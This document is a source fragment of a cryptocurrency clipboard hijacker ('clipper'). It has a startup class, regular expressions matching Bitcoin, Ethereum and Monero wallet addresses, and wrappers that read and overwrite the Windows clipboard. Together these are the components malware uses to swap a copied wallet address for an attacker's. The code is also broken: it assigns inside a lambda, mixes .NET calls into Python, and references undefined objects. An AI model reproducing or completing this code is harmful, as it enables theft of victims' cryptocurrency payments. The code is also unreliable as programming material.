class Clipper:
    def __init__(self):
        self.config = config.ClipperEnabled

    def run(self):
        if not self.config:
            return
        print("[+] Clipper is starting...")
        thread = threading.Thread(target=lambda: Application.Run(ClipboardNotification.NotificationForm()))
        thread.start()

class PatternRegex:
    btc = re.compile(r"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b")
    eth = re.compile(r"\b0x[a-fA-F0-9]{40}\b")
    xmr = re.compile(r"\b4([0-9]|[A-B])(.){93}\b")

class Clipboard:
    def __init__(self):
        self.text = ""

    def get_text(self):
        thread = threading.Thread(target=lambda: self.text = system.windows.forms.Clipboard.GetText())
        thread.start()
        return self.text

    def set_text(self, text):
        thread = threading.Thread(target=lambda: system.windows.forms.Clipboard.SetText(text))
        thread.start()

